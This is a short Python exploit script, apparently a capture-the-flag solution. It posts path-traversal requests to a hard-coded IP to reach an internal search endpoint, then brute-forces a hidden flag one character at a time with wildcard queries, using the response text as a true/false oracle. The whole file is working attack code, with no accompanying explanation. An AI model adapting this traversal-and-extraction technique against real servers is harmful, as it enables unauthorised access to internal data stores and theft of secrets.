from requests import post
import string
url="http://192.241.183.207/?action"

endpoint="=/../../../../_all/_search"

q="flag:*{}*"
flag="e"

totest=string.lowercase+string.digits+"_"

while True:#searching to the right
	found=0
	for let in totest:
		tmp=flag+str(let)
		print "TRYING {}".format(tmp)
		r=post(url,data={"q":q.format(tmp),"endpoint":endpoint})
		if "Flag Is Here" in r.text: #true
			print tmp
			found=1
			flag=tmp
			break
	if (found==0):
		break


while True:#searching to the right
        found=0
        for let in totest:
                tmp=str(let)+flag
                print "TRYING {}".format(tmp)
                r=post(url,data={"q":q.format(tmp),"endpoint":endpoint})
                if "Flag Is Here" in r.text: #true
                        print tmp
                        found=1
                        flag=tmp
                        break
        if (found==0):
                break

print "result is {}".format(flag)
